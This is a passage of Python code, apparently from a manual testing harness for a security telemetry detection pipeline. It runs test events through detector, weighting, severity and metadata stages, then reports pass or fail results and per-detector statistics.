    # ------------------------------------------------------------------
    # STAGE 1: DETECTOR
    # ------------------------------------------------------------------
    def _run_detector_stage(
        self, test_case: TelemetryTestCase
    ) -> Tuple[Optional[Any], float, bool, List[str], List[str], List[str], Optional[float], str, Optional[str]]:
        binding = self._detectors.get(test_case.telemetry_type)
        detector_name = binding.class_name if binding else "UNAVAILABLE"

        if binding is None:
            return None, 0.0, False, [], [], [], None, detector_name, (
                f"No detector bound for telemetry type '{test_case.telemetry_type}'."
            )

        try:
            result_obj = binding.detect(test_case.event)
        except Exception as exc:
            logger.exception("Detector '%s' raised for test '%s'.", detector_name, test_case.name)
            return None, 0.0, False, [], [], [], None, detector_name, f"Detector raised: {exc}"

        risk_points = safe_float(getattr(result_obj, "risk_points", 0.0))
        is_dangerous = bool(getattr(result_obj, "is_dangerous", risk_points > 0.0))
        rules_matched = flatten_to_str_list(getattr(result_obj, "matched_rules", []))
        indicators_matched = extract_indicators(result_obj)
        reasons = flatten_to_str_list(getattr(result_obj, "reasons", []))

        raw_confidence = getattr(result_obj, "confidence", None)
        detector_confidence = safe_float(raw_confidence) if raw_confidence is not None else None

        return (
            result_obj, risk_points, is_dangerous, rules_matched,
            indicators_matched, reasons, detector_confidence, detector_name, None,
        )

    # ------------------------------------------------------------------
    # STAGE 2: EVENT WEIGHTING
    # ------------------------------------------------------------------
    def _run_weighting_stage(self, event: Dict[str, Any]) -> Tuple[float, str, Optional[str]]:
        if self._weight_engine is None:
            return 0.0, "UNKNOWN", "Event weighting engine unavailable."
        try:
            weight_result = self._weight_engine.evaluate(event)
        except Exception as exc:
            logger.exception("Event weighting stage failed.")
            return 0.0, "UNKNOWN", f"Weighting stage raised: {exc}"

        weight_value = safe_float(getattr(weight_result, "weight", 0.0))
        event_type_label = safe_name(getattr(weight_result, "event_type", None), "UNKNOWN")
        return weight_value, event_type_label, None

    # ------------------------------------------------------------------
    # STAGE 3: SEVERITY DECISION
    # ------------------------------------------------------------------
    def _run_severity_stage(self, weighted_score: float) -> Tuple[Any, str, float, float, str, Optional[str]]:
        if self._severity_engine is None:
            return None, "INFO", 0.0, 0.0, "", "Severity decision engine unavailable."
        try:
            severity_result = self._severity_engine.evaluate(weighted_score)
        except Exception as exc:
            logger.exception("Severity decision stage failed.")
            return None, "INFO", 0.0, 0.0, "", f"Severity stage raised: {exc}"

        severity_obj = getattr(severity_result, "severity", None)
        severity_name = safe_name(severity_obj, "INFO")
        severity_confidence = safe_float(getattr(severity_result, "confidence", 0.0))
        severity_threshold = safe_float(getattr(severity_result, "threshold_used", 0.0))
        severity_reason = safe_str(getattr(severity_result, "reason", ""))
        return severity_obj, severity_name, severity_confidence, severity_threshold, severity_reason, None

    # ------------------------------------------------------------------
    # STAGE 4: SEVERITY METADATA
    # ------------------------------------------------------------------
    def _run_metadata_stage(
        self,
        test_case: TelemetryTestCase,
        severity_obj: Any,
        severity_name: str,
        risk_points: float,
        weight_value: float,
        weighted_score: float,
        severity_threshold: float,
        severity_reason: str,
        event_type_label: str,
        reasons: List[str],
        rules_matched: List[str],
        indicators_matched: List[str],
        detector_confidence: Optional[float],
        duration_ms: float,
    ) -> Tuple[str, float, str, Optional[str]]:
        if self._metadata_builder is None:
            return severity_name, detector_confidence or 0.0, "Metadata builder unavailable.", (
                "Severity metadata builder unavailable."
            )
        try:
            metadata = self._metadata_builder.build(
                severity=severity_obj if severity_obj is not None else severity_name,
                risk_score=risk_points,
                confidence=detector_confidence,
                base_risk=risk_points,
                event_weight=weight_value,
                final_risk=weighted_score,
                severity_threshold=severity_threshold,
                severity_reason=severity_reason,
                event_type=event_type_label,
                reasons=reasons + ([severity_reason] if severity_reason else []),
                matched_rules=rules_matched,
                matched_indicators=indicators_matched,
                event_id=test_case.name,
                telemetry_source="ManualTestingEngine",
                timestamp=datetime.now(timezone.utc),
                analysis_duration_ms=duration_ms,
            )
        except Exception as exc:
            logger.exception("Metadata stage failed for test '%s'.", test_case.name)
            return severity_name, detector_confidence or 0.0, "Metadata unavailable due to pipeline error.", (
                f"Metadata stage raised: {exc}"
            )

        final_severity = safe_str(getattr(metadata, "severity", severity_name), severity_name)
        final_confidence = safe_float(getattr(metadata, "confidence", detector_confidence or 0.0))
        summary_text = safe_str(getattr(metadata, "summary", ""))
        return final_severity, final_confidence, summary_text, None

    # ------------------------------------------------------------------
    # PASS / FAIL DERIVATION
    # ------------------------------------------------------------------
    def _derive_verdict(
        self,
        test_case: TelemetryTestCase,
        is_dangerous: bool,
        severity_name: str,
        pipeline_error: Optional[str],
    ) -> Tuple[bool, str]:
        if pipeline_error:
            return False, f"Pipeline execution error: {pipeline_error}"

        rank = _severity_rank(severity_name)
        expected = test_case.expected_outcome

        if expected == ExpectedOutcome.MALICIOUS:
            if is_dangerous and rank >= _SEVERITY_RANK["MEDIUM"]:
                return True, "Malicious telemetry correctly escalated to at least MEDIUM severity."
            return False, (
                f"Malicious telemetry expected material escalation but pipeline produced "
                f"severity={severity_name} (is_dangerous={is_dangerous})."
            )

        if expected == ExpectedOutcome.SUSPICIOUS:
            if is_dangerous and rank >= _SEVERITY_RANK["LOW"]:
                return True, "Suspicious telemetry correctly flagged with elevated severity."
            return False, (
                f"Suspicious telemetry expected some elevation but pipeline produced "
                f"severity={severity_name} (is_dangerous={is_dangerous})."
            )

        if expected == ExpectedOutcome.BENIGN:
            if rank <= _SEVERITY_RANK["LOW"] and not is_dangerous:
                return True, "Benign telemetry correctly assessed as low risk."
            return False, (
                f"Benign telemetry incorrectly escalated to severity={severity_name} "
                f"(is_dangerous={is_dangerous})."
            )

        # INFORMATIONAL: no strong expectation, pipeline just needs to run cleanly.
        return True, "No strict expectation defined for this sample; pipeline executed without contradiction."

    # ------------------------------------------------------------------
    # SINGLE TEST EXECUTION
    # ------------------------------------------------------------------
    def _run_single_test(self, test_case: TelemetryTestCase) -> PipelineTestResult:
        start = time.perf_counter()

        (
            result_obj, risk_points, is_dangerous, rules_matched,
            indicators_matched, reasons, detector_confidence, detector_name, detector_error,
        ) = self._run_detector_stage(test_case)

        weight_value, event_type_label, weighting_error = self._run_weighting_stage(test_case.event)

        try:
            weighted_score = event_weighting_mod.combine_weight(risk_points, weight_value)
        except Exception:
            weighted_score = risk_points + weight_value

        severity_obj, severity_name, _severity_conf, severity_threshold, severity_reason, severity_error = (
            self._run_severity_stage(weighted_score)
        )

        pipeline_error = detector_error or weighting_error or severity_error

        duration_so_far_ms = (time.perf_counter() - start) * 1000.0
        final_severity, final_confidence, summary_text, metadata_error = self._run_metadata_stage(
            test_case, severity_obj, severity_name, risk_points, weight_value, weighted_score,
            severity_threshold, severity_reason, event_type_label, reasons, rules_matched,
            indicators_matched, detector_confidence, duration_so_far_ms,
        )
        pipeline_error = pipeline_error or metadata_error

        passed, verdict_reason = self._derive_verdict(
            test_case, is_dangerous, final_severity, pipeline_error
        )

        duration_ms = (time.perf_counter() - start) * 1000.0

        return PipelineTestResult(
            test_name=test_case.name,
            telemetry_type=test_case.telemetry_type,
            category=test_case.category,
            detector_used=detector_name,
            indicators_matched=indicators_matched,
            rules_matched=rules_matched,
            risk_score=risk_points,
            weighted_score=safe_float(weighted_score),
            severity=final_severity,
            confidence=final_confidence,
            reasons=reasons + ([severity_reason] if severity_reason else []),
            summary=summary_text,
            passed=passed,
            verdict_reason=verdict_reason,
            duration_ms=duration_ms,
            exception_text=pipeline_error,
        )

    # ------------------------------------------------------------------
    # SUITE EXECUTION
    # ------------------------------------------------------------------
    def run_all(self, test_cases: Optional[Sequence[TelemetryTestCase]] = None) -> List[PipelineTestResult]:
        """
        Executes every telemetry sample through the full pipeline.
        Uses a thread pool for execution (each test is independent and
        the underlying engines are stateless), while `.map()` preserves
        input ordering for deterministic, readable reporting.
        """
        cases = list(test_cases) if test_cases is not None else build_all_test_cases()
        results: List[PipelineTestResult] = []

        with ThreadPoolExecutor(max_workers=8) as executor:
            for result in executor.map(self._run_single_test, cases):
                results.append(result)

        return results


# ======================================================================
# REPORTING
# ======================================================================

def _format_list(items: Sequence[str], empty_label: str = "None") -> str:
    return ", ".join(items) if items else empty_label


def print_test_report(result: PipelineTestResult) -> None:
    verdict = "PASS" if result.passed else "FAIL"
    print("-" * 100)
    print(f"Test Name         : {result.test_name}")
    print(f"Telemetry Type    : {result.telemetry_type}")
    print(f"Category          : {result.category}")
    print(f"Detector Used     : {result.detector_used}")
    print(f"Indicators Matched: {_format_list(result.indicators_matched)}")
    print(f"Rules Matched     : {_format_list(result.rules_matched)}")
    print(f"Risk Score        : {result.risk_score:.2f}")
    print(f"Weighted Score    : {result.weighted_score:.2f}")
    print(f"Severity          : {result.severity}")
    print(f"Confidence        : {result.confidence:.2f}")
    print(f"Reasons           : {_format_list(result.reasons)}")
    print(f"Summary           : {result.summary}")
    if result.exception_text:
        print(f"Pipeline Error    : {result.exception_text}")
    print(f"Verdict Reason    : {result.verdict_reason}")
    print(f"Duration (ms)     : {result.duration_ms:.3f}")
    print(f"RESULT            : {verdict}")


@dataclass
class DetectorStatistics:
    total: int = 0
    passed: int = 0
    failed: int = 0
    risk_scores: List[float] = field(default_factory=list)
    confidences: List[float] = field(default_factory=list)
    severity_ranks: List[int] = field(default_factory=list)


def _average(values: Sequence[float]) -> float:
    return statistics.fmean(values) if values else 0.0


def print_summary_report(results: Sequence[PipelineTestResult], total_duration_s: float) -> None:
    total = len(results)
    passed = sum(1 for r in results if r.passed)
    failed = total - passed
    success_pct = (passed / total * 100.0) if total else 0.0

    detector_stats: Dict[str, DetectorStatistics] = {}
    for result in results:
        stats = detector_stats.setdefault(result.telemetry_type, DetectorStatistics())
        stats.total += 1
        stats.passed += 1 if result.passed else 0
        stats.failed += 0 if result.passed else 1
        stats.risk_scores.append(result.risk_score)
        stats.confidences.append(result.confidence)
        stats.severity_ranks.append(_severity_rank(result.severity))

    overall_avg_risk = _average([r.risk_score for r in results])
    overall_avg_confidence = _average([r.confidence for r in results])
    overall_avg_severity_rank = _average([_severity_rank(r.severity) for r in results])

    rank_to_name = {v: k for k, v in _SEVERITY_RANK.items()}
    nearest_rank = min(rank_to_name.keys(), key=lambda r: abs(r - overall_avg_severity_rank)) if results else 1
    overall_avg_severity_label = rank_to_name.get(nearest_rank, "INFO")

    print("=" * 100)
    print("MANUAL TESTING ENGINE - FINAL SUMMARY")
    print("=" * 100)
    print(f"Total Tests        : {total}")
    print(f"Passed             : {passed}")
    print(f"Failed             : {failed}")
    print(f"Success Percentage : {success_pct:.2f}%")
    print(f"Average Risk Score : {overall_avg_risk:.2f}")
    print(f"Average Confidence : {overall_avg_confidence:.2f}")
    print(f"Average Severity   : {overall_avg_severity_label} (rank {overall_avg_severity_rank:.2f})")
    print(f"Execution Time     : {total_duration_s:.3f} seconds")
    print("-" * 100)
    print("Detector-wise Statistics:")
    for telemetry_type, stats in sorted(detector_stats.items()):
        stats_success_pct = (stats.passed / stats.total * 100.0) if stats.total else 0.0
        avg_rank = _average(stats.severity_ranks)
        nearest = min(rank_to_name.keys(), key=lambda r: abs(r - avg_rank)) if stats.severity_ranks else 1
        print(
            f"  [{telemetry_type:9s}] Total={stats.total:3d}  Passed={stats.passed:3d}  "
            f"Failed={stats.failed:3d}  Success={stats_success_pct:6.2f}%  "
            f"AvgRisk={_average(stats.risk_scores):6.2f}  "
            f"AvgConfidence={_average(stats.confidences):6.2f}  "
            f"AvgSeverity={rank_to_name.get(nearest, 'INFO')}"
        )
    print("=" * 100)


# ======================================================================
# ENTRY POINT
# ======================================================================

def main() -> int:
    """
    Runs the full manual validation suite and prints a detailed report
    plus an aggregate summary. Returns a process-style exit code
    (0 = all passed, 1 = one or more failures) without ever stopping
    mid-suite due to an individual detector exception.
    """
    engine = ManualTestingEngine()

    start = time.perf_counter()
    results = engine.run_all()
    total_duration_s = time.perf_counter() - start

    for result in results:
        print_test_report(result)

    print_summary_report(results, total_duration_s)

    return 0 if all(r.passed for r in results) else 1


if __name__ == "__main__":
    sys.exit(main())